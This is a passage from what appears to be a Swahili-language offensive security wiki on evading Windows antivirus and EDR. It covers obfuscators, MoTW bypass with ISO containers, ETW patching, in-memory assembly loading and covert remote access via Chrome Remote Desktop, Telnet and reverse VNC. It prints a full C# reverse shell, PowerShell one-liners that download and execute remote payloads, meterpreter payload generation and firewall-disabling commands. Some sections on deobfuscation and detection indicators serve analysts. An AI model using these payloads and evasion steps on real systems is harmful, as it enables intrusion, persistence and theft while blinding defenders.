> Mbinu kadhaa za obfuscation hutegemea kusimba data kwa njia fiche, jambo litakaloongeza entropy ya binary na kurahisisha AVs na EDRs kuigundua. Kuwa mwangalifu na hili, na labda tumia usimbaji fiche kwenye sehemu mahususi tu za code yako ambazo ni nyeti au zinahitaji kufichwa.

### Kuondoa Obfuscation kwenye .NET Binaries Zilizolindwa na ConfuserEx

Unapochanganua malware inayotumia ConfuserEx 2 (au forks za kibiashara), ni jambo la kawaida kukumbana na tabaka kadhaa za ulinzi zinazozuia decompilers na sandboxes. Mchakato ulio hapa chini hurejesha kwa uhakika **IL iliyo karibu na ya awali**, ambayo baadaye inaweza kugeuzwa kuwa C# kwa zana kama dnSpy au ILSpy.<sup>[[10]](#references)</sup>

1.  Kuondoa anti-tampering – ConfuserEx husimba kila *method body* na kuifungua ndani ya static constructor ya *module* (`<Module>.cctor`). Pia hubadilisha PE checksum ili marekebisho yoyote yasababishe binary ku-crash. Tumia **AntiTamperKiller** kutambua metadata tables zilizosimbwa, kurejesha XOR keys na kuandika upya assembly safi:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output ina vigezo 6 vya anti-tamper (`key0-key3`, `nameHash`, `internKey`) vinavyoweza kusaidia unapounda unpacker yako mwenyewe.

2.  Urejeshaji wa symbol / control-flow – tumia faili *safi* na **de4dot-cex** (fork ya de4dot inayotambua ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – chagua profile ya ConfuserEx 2
     • de4dot itabatilisha control-flow flattening, kurejesha namespaces, classes na majina ya variables ya awali, na kusimbua strings za constants.

3.  Proxy-call stripping – ConfuserEx hubadilisha direct method calls kwa wrappers nyepesi (zinazojulikana pia kama *proxy calls*) ili kufanya decompilation iwe ngumu zaidi. Ziondoe kwa kutumia **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Baada ya hatua hii, unapaswa kuona .NET API za kawaida kama `Convert.FromBase64String` au `AES.Create()` badala ya wrapper functions zisizoeleweka (`Class8.smethod_10`, …).

4.  Usafishaji wa mkono – endesha binary iliyopatikana chini ya dnSpy, tafuta data kubwa ya Base64 au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kupata payload *halisi*. Mara nyingi malware huihifadhi kama byte array iliyosimbwa kwa TLV, iliyoanzishwa ndani ya `<Module>.byte_0`.

Mlolongo huu hurejesha mtiririko wa utekelezaji **bila** kuhitaji kuendesha sample hasidi – ni muhimu unapofanya kazi kwenye workstation isiyo na muunganisho wa mtandao.

> 🛈  ConfuserEx hutengeneza attribute maalum inayoitwa `ConfusedByAttribute` ambayo inaweza kutumika kama IOC kupanga samples kiotomatiki.

#### Amri ya mstari mmoja
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya open-source ya suite ya compilation ya [LLVM](http://www.llvm.org/) inayoweza kutoa usalama wa juu zaidi wa software kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na kuzuia uchezewaji.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kutengeneza code iliyofichwa wakati wa compilation, bila kutumia tool yoyote ya nje na bila kurekebisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Huongeza safu ya operations zilizofichwa zinazozalishwa na framework ya C++ template metaprogramming, ambayo itafanya maisha ya mtu anayetaka kuvunja application kuwa magumu kidogo.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza kuficha aina mbalimbali za pe files, zikiwemo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni engine rahisi ya metamorphic code kwa executables za aina yoyote.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni framework ya code obfuscation ya kiwango cha chini kwa lugha zinazoungwa mkono na LLVM, inayotumia ROP (return-oriented programming). ROPfuscator huficha program katika kiwango cha assembly code kwa kubadilisha instructions za kawaida kuwa ROP chains, na hivyo kuzuia mtazamo wetu wa kawaida kuhusu control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuzipakia

### LLVM compiler-assisted per-function self-masking

Badala ya kuficha implant nzima wakati tu imelala, LLVM X86 backend iliyorekebishwa inaweza kuweka functions zilizochaguliwa zikiwa XOR-masked kila zinapokuwa hazitumiki. PoC ya Function Peekaboo huchagua majina yaliyodemangle yenye `REG_`, huingiza entry/exit stubs zisizotegemea mahali katika machine code ya mwisho, na kutoa handler moja ya masking inayotumiwa kwa pamoja ndani ya `.text`; signatures za kiwango cha source na calling convention ya Windows x64 hubaki vilevile.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Hii hufanyika baada ya instruction selection na optimization kwa sababu transformation lazima ihusishe **kila return inayotolewa** na ijue mpangilio halisi wa x86. `MachineFunctionPass` ya kabla ya emission hutafuta `MachineInstr::isReturn()` ya mwisho, huifuta ili njia ya mwisho iendelee hadi epilogue iliyoongezwa, na kubadilisha returns za awali kuwa `JMP_1 handler`. Hifadhi stack/frame teardown yoyote iliyozalishwa na compiler kabla ya kila return; elekeza upya instruction ya return pekee.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` na `emitFunctionBodyEnd()` hutoa stubs za kila function, huku `emitEndOfAsmFile()` ikitoa handler. Symbols zinazotumiwa kwa pamoja kati ya hatua za emission huruhusu branch ya prologue kulenga epilogue yake itakayokuja baadaye; kwa `je` ya near inayotolewa kwa mkono, andika `0F 84` ikifuatiwa na MC expression ya byte nne `target - address_after_je`. Badala yake, calls na jumps kwenda kwa handler zinaweza kutolewa kama objects za `MCInst` (`CALL64pcrel32` na `JMP_1`). Pass lazima irudishe `false` kwa function isiyochaguliwa ikiwa haikubadilisha chochote; PoC inarudisha `true` kimakosa katika hali hiyo.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoC huweka XOR key na records za byte 16 zenye function pointer iliyorekebishwa na loader pamoja na runtime length ndani ya `.funcmeta`. Ingawa field ya C ni `uint32_t`, handler husoma QWORD kwenye offset `+8` ya record, ikitumia length na padding yake, na husonga mbele kwa `0x10` kwa kila record. Majina ya PE section yana urefu wa byte nane pekee, kwa hiyo runtime lookup huona `.funcmet`. Patcher ya nje huongeza `.stub` inayoweza kutekeleza code, huhifadhi RVA ya entry-point ya awali ndani ya stub, na kuelekeza `AddressOfEntryPoint` upya; PIC stub hupata image base kutoka `gs:[0x60]` → `[PEB+0x10]`, hupitia PE32+ imports ili kupata `VirtualProtect` ambayo tayari ime-importiwa, na huendeshwa kabla ya CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Initialization huweka sentinel ndani ya `gs:[0xE8]` na kuita kila function ya metadata. Prologue yake inayosomeka daima huhifadhi mwanzo wa function katika `gs:[0xF0]`, hutambua sentinel, na kuruka body ambayo bado haijafichwa. Epilogue kisha hutumia `call handler`; baada ya handler kuhifadhi registers 13 (`0x68` bytes), return address kwenye `[rsp+0x68]` huwa mwisho wa function iliyobadilishwa, kwa hiyo `end - start` inaweza kuandikwa kwenye record yake ya metadata. Stub huondoa sentinel na kuruka hadi `ImageBase + original_entry_point_RVA` baada ya bodies zote kufichwa.<sup>[[38]](#references)[[39]](#references)</sup>

Wakati wa call ya kawaida, prologue huita handler yuleyule ili kufungua body. Njia ya mwisho huingia kwenye epilogue iliyoongezwa, huku kila return ya awali ikiruka moja kwa moja kwa handler ya pamoja. Epilogue ya kawaida pia hutumia `jmp handler` badala ya `call`, kwa hiyo baada ya kuficha tena, `ret` ya handler hutumia return address ya caller wa awali na kuhifadhi matokeo ya function ndani ya `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

Handler hupata record ya sasa, huruka prologue inayoonekana yenye urefu usiobadilika (`0x46` bytes katika build hii), hubadilisha sehemu iliyobaki kuwa `PAGE_EXECUTE_READWRITE`, hufanya XOR ya kila byte kwa kutumia byte ya chini ya key, na kisha huiweka kuwa `PAGE_EXECUTE_READ`. Kwa hiyo loop hiyo hiyo hufungua code inapoingia na kuificha tena kila inapotoka kawaida.<sup>[[38]](#references)[[39]](#references)</sup>

Viashiria vyenye nguvu vya muundo huu ni pamoja na:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point ndani ya `.stub` inayoweza kutekeleza code na section ya `.funcmet` yenye key pamoja na pointers za `.text` zilizorekebishwa;
- kuchanganua PEB, import-table, na section-table kabla ya CRT, kisha kuita kila pointer ya metadata;
- PIC prologues zinazofanana za `call`/`pop` na return sites nyingi zinazoelekezwa upya kwa handler mmoja;
- writes kwenda `gs:[0xE8]`, `gs:[0xF0]`, na `gs:[0xF8]`, zikifuatiwa na mabadiliko ya mara kwa mara ya `VirtualProtect` na writes za XOR za kila byte ndani ya executable pages zinazotokana na image.

Huu ni ukwepaji wa memory scanner, si ulinzi wa cryptographic: file iliyopatiwa patch bado ina body ya awali iliyo wazi, na debugger inaweza kusimama kwenye `VirtualProtect` au loop ya XOR na kutoa dump ya function inayotumika. XOR ya byte moja, metadata inayosomeka, na mpaka usiobadilika wa `0x46` pia hurahisisha recovery ya offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slots za PoC ni za kila thread, lakini code pages zilizobadilishwa hutumika kwa process nzima. Kwa hiyo, kuingia kwa wakati mmoja au kwa kujirudia kunaweza kubadilisha tena instructions huku invocation nyingine ikiendelea kutekelezwa; exceptions na nonlocal exits pia zinaweza kuruka hatua ya kuficha tena. Utekelezaji imara lazima usawazishe mabadiliko, urejeshe protection iliyorejeshwa kupitia `lpflOldProtect`, uepuke urefu wa stub uliowekwa kwa namba isiyobadilika, ukague njia zote za `call` na `jmp` kwa mpangilio sahihi wa stack wa x64, na uite `FlushInstructionCache` baada ya kuandika upya bytes zinazoweza kutekelezwa. Microsoft inaweka wazi kwamba caller anawajibika kuhakikisha instruction-cache coherency wakati code inayoweza kutekelezwa inabadilishwa.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Huenda umewahi kuona skrini hii unapopakua baadhi ya executables kutoka internet na kuziendesha.

Microsoft Defender SmartScreen ni utaratibu wa usalama unaolenga kumlinda mtumiaji wa mwisho dhidi ya kuendesha applications zinazoweza kuwa hasidi.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen hutumia hasa mbinu inayotegemea reputation, kumaanisha kwamba applications ambazo hazipakuliwi mara nyingi zitaanzisha SmartScreen na hivyo kumtahadharisha mtumiaji wa mwisho na kumzuia kutekeleza file (ingawa file bado inaweza kutekelezwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina la Zone.Identifier ambayo huundwa kiotomatiki files zinapopakuliwa kutoka internet, pamoja na URL ambayo zilipakuliwa kutoka kwake.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kukagua Zone.Identifier ADS ya file lililopakuliwa kutoka internet.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kufahamu kwamba executables zilizosainiwa kwa certificate ya kusaini **inayoaminika** **hazitaanzisha SmartScreen**.

Njia yenye ufanisi mkubwa ya kuzuia payloads zako kupata Mark of The Web ni kuziweka ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwenye volumes **zisizo za NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni tool inayofungasha payloads ndani ya output containers ili kukwepa Mark-of-the-Web.

Mfano wa matumizi:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Huu hapa mfano wa kupita SmartScreen kwa kufungasha payloads ndani ya faili za ISO kwa kutumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni mfumo madhubuti wa kuweka kumbukumbu katika Windows unaoruhusu programu na vipengele vya mfumo **kuweka kumbukumbu za matukio**. Hata hivyo, bidhaa za usalama zinaweza pia kuutumia kufuatilia na kugundua shughuli hasidi.

Sawa na jinsi AMSI inavyozimwa (kupitwa), inawezekana pia kufanya kazi ya **`EtwEventWrite`** ya mchakato wa user space irudi mara moja bila kuweka kumbukumbu za matukio yoyote. Hili hufanywa kwa kubandika kazi hiyo kwenye memory ili irudi mara moja, na hivyo kuzima uwekaji wa kumbukumbu za ETW kwa mchakato huo.

Unaweza kupata maelezo zaidi kwenye **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) na [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Kupakia C# binaries kwenye memory kumejulikana kwa muda mrefu, na bado ni njia nzuri sana ya kuendesha zana zako za post-exploitation bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa disk, tunahitaji tu kuwa na wasiwasi kuhusu kubandika AMSI kwa mchakato mzima.

Frameworks nyingi za C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, n.k.) tayari zina uwezo wa kutekeleza C# assemblies moja kwa moja kwenye memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Hii inahusisha **kuanzisha mchakato mpya wa kutumiwa mara moja**, kuingiza msimbo hasidi wa post-exploitation ndani ya mchakato huo mpya, kutekeleza msimbo hasidi na kuua mchakato mpya ukikamilika. Njia hii ina faida na hasara zake. Faida ya njia ya fork and run ni kwamba utekelezaji hufanyika **nje ya** mchakato wetu wa Beacon implant. Hii ina maana kwamba ikiwa jambo lolote litaenda vibaya au kugunduliwa wakati wa shughuli zetu za post-exploitation, kuna **uwezekano mkubwa zaidi** wa **implant yetu kuendelea kufanya kazi.** Hasara ni kwamba kuna **uwezekano mkubwa zaidi** wa kugunduliwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Hii inahusu kuingiza msimbo hasidi wa post-exploitation **ndani ya mchakato wake wenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kuufanyia AV scan, lakini hasara ni kwamba jambo likienda vibaya wakati wa kutekeleza payload yako, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwa kuwa inaweza ku-crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ukitaka kusoma zaidi kuhusu kupakia C# Assembly, angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**; angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [video ya S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Kutumia Lugha Nyingine za Programu

Kama ilivyopendekezwa kwenye [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza msimbo hasidi kwa kutumia lugha nyingine kwa kuipa mashine iliyoathiriwa ufikiaji **wa mazingira ya interpreter yaliyosakinishwa kwenye SMB share inayodhibitiwa na Attacker**.

Kwa kuruhusu ufikiaji wa Interpreter Binaries na mazingira yake kwenye SMB share, unaweza **kutekeleza msimbo wowote katika lugha hizi ndani ya memory** ya mashine iliyoathiriwa.

Repo inaeleza: Defender bado huchanganua scripts, lakini kwa kutumia Go, Java, PHP, n.k. tunapata **uwezo zaidi wa kupita static signatures**. Majaribio kwa kutumia scripts za reverse shell zisizofichwa kwa obfuscation katika lugha hizi yamefanikiwa.

## WebAssembly re-hosting for static-analysis evasion

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping hubadilisha access token ya bidhaa ya usalama kama vile EDR au AV. Kupunguza ruhusa za token kunaweza kuacha mchakato ukiendelea kufanya kazi huku kukizuia kutekeleza ukaguzi au hatua za kurekebisha zinazohitaji ruhusa maalum.

Ili kuzuia hili, Windows inaweza **kuzuia michakato ya nje** kupata handles za tokens za michakato ya usalama.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Kutumia Programu Zinazoaminika

### Chrome Remote Desktop

Kama ilivyoelezwa kwenye [**makala hii ya blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi kusakinisha Chrome Remote Desktop kwenye PC ya mwathiriwa, kisha kuitumia kuichukua na kudumisha persistence:<sup>[[35]](#references)</sup>
1. Pakua kutoka https://remotedesktop.google.com/, bofya "Set up via SSH", kisha bofya faili ya MSI ya Windows ili kuipakua.
2. Endesha kisakinishi kimyakimya kwenye mashine ya mwathiriwa (unahitaji admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na ubofye next. Wizard itakuomba uidhinishe; bofya kitufe cha Authorize ili kuendelea.
4. Tekeleza amri uliyopewa baada ya kufanya marekebisho yanayohitajika: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parameter ya `--pin` huweka PIN bila kutumia GUI).
 

## Advanced Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion ni mada ngumu sana; wakati mwingine unapaswa kuzingatia vyanzo vingi tofauti vya telemetry katika mfumo mmoja, kwa hiyo karibu haiwezekani kubaki bila kugunduliwa kabisa katika mazingira yaliyokomaa.

Kila mazingira utakayokabiliana nayo yatakuwa na uwezo na udhaifu wake.

Ninakuhimiza sana uangalie mazungumzo haya ya [@ATTL4S](https://twitter.com/DaniLJ94) ili upate msingi wa kuelewa mbinu za Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Haya pia ni mazungumzo mengine mazuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Mbinu za Zamani**

### **Angalia ni sehemu zipi Defender huzitambua kuwa hasidi**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), ambayo **huondoa sehemu za binary** hatua kwa hatua hadi **itagundua ni sehemu gani Defender** inayoitambua kuwa hasidi, kisha inakuonyesha sehemu hiyo.\
Zana nyingine inayofanya **jambo hilo hilo ni** [**avred**](https://github.com/dobin/avred), inayotoa huduma hiyo kupitia tovuti kwenye [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo ungeweza kusakinisha (kama administrator) kwa kutekeleza:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Isanidi ianze mfumo unapowashwa na **uiendeshe** sasa:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Badilisha port ya telnet** (stealth) **na uzime firewall:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unahitaji downloads za bin, si setup)

**KWENYE HOST**: Tekeleza _**winvnc.exe**_ na usanidi server:

- Washa chaguo la _Disable TrayIcon_
- Weka password katika _VNC Password_
- Weka password katika _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na faili _**UltraVNC.ini**_ lililoundwa **hivi karibuni** ndani ya **victim**

#### **Reverse connection**

**Attacker** anapaswa **kutekeleza ndani ya** **host** yake binary `vncviewer.exe -listen 5900` ili iwe **tayari** kupokea **VNC connection** ya reverse. Kisha, ndani ya **victim**: Anzisha daemon ya winvnc `winvnc.exe -run` na utekeleze `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ONYO:** Ili kudumisha stealth, usifanye mambo machache

- Usianzishe `winvnc` ikiwa tayari inaendeshwa, la sivyo utasababisha [popup](https://i.imgur.com/1SROTTl.png). angalia ikiwa inaendeshwa kwa kutumia `tasklist | findstr winvnc`
- Usianzishe `winvnc` bila `UltraVNC.ini` katika directory hiyo hiyo, la sivyo itasababisha [config window](https://i.imgur.com/rfMQWcf.png) kufunguka
- Usitumie `winvnc -h` kutafuta msaada, la sivyo utasababisha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Ndani ya GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sasa **anzisha lister** kwa kutumia `msfconsole -r file.rc` na **tekeleza** **xml payload** kwa kutumia:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Defender ya sasa itasitisha mchakato haraka sana.**

### Kukompile reverse shell yetu wenyewe

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Reverse shell ya kwanza ya C#

Ikkompile kwa kutumia:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Itumie pamoja na:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# kwa kutumia compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Upakuaji na utekelezaji wa kiotomatiki:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia Python kutengeneza injectors: mfano

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine zaidi

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Zaidi

